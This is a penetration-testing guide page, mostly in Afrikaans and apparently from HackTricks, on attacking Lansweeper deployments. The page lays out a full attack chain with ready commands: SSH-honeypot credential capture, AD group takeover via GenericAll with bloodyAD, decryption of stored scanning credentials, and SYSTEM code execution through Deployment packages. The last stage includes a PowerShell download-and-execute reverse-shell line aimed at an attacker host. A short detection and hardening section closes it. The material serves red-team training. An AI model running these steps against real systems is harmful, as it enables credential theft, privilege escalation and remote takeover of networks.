# Lansweeper Misbruik: Kredensiaal-insameling, Secrets-dekripsie, en Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper is 'n IT-bates-ontdekking en inventarisplatform wat algemeen op Windows ontplooi word en met Active Directory geïntegreer is. Kredensiale wat in Lansweeper gekonfigureer is, word deur sy skandeer-enjins gebruik om te verifieer by stelsels oor protokolle soos SSH, SMB/WMI en WinRM. Verkeerde konfigurasies laat dikwels toe:

- Kredensiaalafluistering deur 'n skandeer-doelwit na 'n aanvaller-beheerde gasheer te herlei (honeypot)
- Misbruik van AD ACLs wat deur Lansweeper-verwante groepe blootgestel word om afstandstoegang te verkry
- Dekripsie op die gasheer van Lansweeper-gekonfigureerde secrets (connection strings en gestoor skandeer-kredensiale)
- Kode-uitvoering op bestuurde eindpunte via die Deployment-funksie (gereeld as SYSTEM)

Hierdie bladsy som praktiese aanval-werkvloei en opdragte op om hierdie gedrag tydens engagements te misbruik.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs, Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Voorbeeld met sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Valideer captured creds teen DC-dienste:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Aantekeninge
- Werk soortgelyk vir ander protokolle wanneer jy die scanner na jou listener kan dwing (SMB/WinRM honeypots, ens.). SSH is dikwels die eenvoudigste.
- Baie scanners identifiseer hulself met kenmerkende kliëntbanners (bv. RebexSSH) en sal benigne opdragte probeer (uname, whoami, ens.).

## 2) AD ACL abuse: verkry afstandstoegang deur jouself by 'n app-admin group te voeg

Gebruik BloodHound om die effektiewe regte van die gekompromiteerde rekening op te som. 'n Algemene bevinding is 'n scanner- of app-spesifieke groep (bv. “Lansweeper Discovery”) wat GenericAll oor 'n bevoorregte groep (bv. “Lansweeper Admins”) het. As die bevoorregte groep ook lid is van “Remote Management Users”, word WinRM beskikbaar sodra ons onsself byvoeg.

Versamelvoorbeelde:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll op groep met BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kry dan 'n interaktiewe shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Wenk: Kerberos-operasies is tydsgevoelig. As jy KRB_AP_ERR_SKEW kry, sinkroniseer eers met die DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Ontsleutel Lansweeper-gekonfigureerde geheime op die gasheer

Op die Lansweeper-bediener stoor die ASP.NET-site gewoonlik 'n versleutelde connection string en 'n simmetriese sleutel wat deur die toepassing gebruik word. Met toepaslike plaaslike toegang kan jy die DB connection string ontsleutel en dan die gestoor scanning credentials uittrek.

Tipiese plekke:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Toepassingsleutel: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Gebruik SharpLansweeperDecrypt om ontsleuteling en die dump van gestoor creds te outomatiseer:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Verwagte uitvoer sluit DB connection details en plaintext scanning credentials in, soos Windows- en Linux-rekeninge wat oor die hele omgewing gebruik word. Hierdie rekeninge het dikwels verhoogde plaaslike regte op domain hosts:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Gebruik herwonne Windows scanning creds vir bevoorregte toegang:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

As 'n lid van “Lansweeper Admins” openbaar die web UI Deployment en Configuration. Onder Deployment → Deployment packages kan jy pakkette skep wat arbitrêre opdragte op geteikende assets uitvoer. Die uitvoering word deur die Lansweeper service met hoë voorregte uitgevoer, wat kode-uitvoering as NT AUTHORITY\SYSTEM op die gekose gasheer lewer.

High-level steps:
- Skep 'n nuwe Deployment package wat 'n PowerShell of cmd one-liner uitvoer (reverse shell, add-user, ens.).
- Teiken die gewenste asset (bv. die DC/host waar Lansweeper loop) en klik Deploy/Run now.
- Kry jou shell as SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Ontplooiingsaksies is lawaaierig en laat logs in Lansweeper en Windows event logs. Gebruik dit spaarsaam.

## Opsporing en verharding

- Beperk of verwyder anonieme SMB-enumerasies. Moniteer vir RID cycling en abnormale toegang tot Lansweeper-shares.
- Egress-beheer: blokkeer of beperk streng uitgaande SSH/SMB/WinRM vanaf scanner-hosts. Waarsku op nie-standaard poorte (bv. 2022) en ongewone kliënt-banners soos Rebex.
- Beskerm `Website\\web.config` en `Key\\Encryption.txt`. Externaliseer secrets in 'n vault en roteer by blootstelling. Oorweeg diensrekeninge met minimale regte en gMSA waar toepaslik.
- AD-monitering: waarsku oor veranderinge aan Lansweeper-verwante groepe (bv. “Lansweeper Admins”, “Remote Management Users”) en oor ACL-wijzigings wat GenericAll/Write-lidmaatskap aan bevoorregte groepe verleen.
- Oudit ontplooiingspakket-skeppings/wysigings/uitvoerings; waarsku as pakkette cmd.exe/powershell.exe begin of onverwagte uitgaande verbindings maak.

## Verwante onderwerpe
- SMB/LSA/SAMR enumerasie en RID cycling
- Kerberos password spraying en klokskewe-oorwegings
- BloodHound padontleding van application-admin-groepe
- WinRM-gebruik en lateral movement

## Verwysings
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
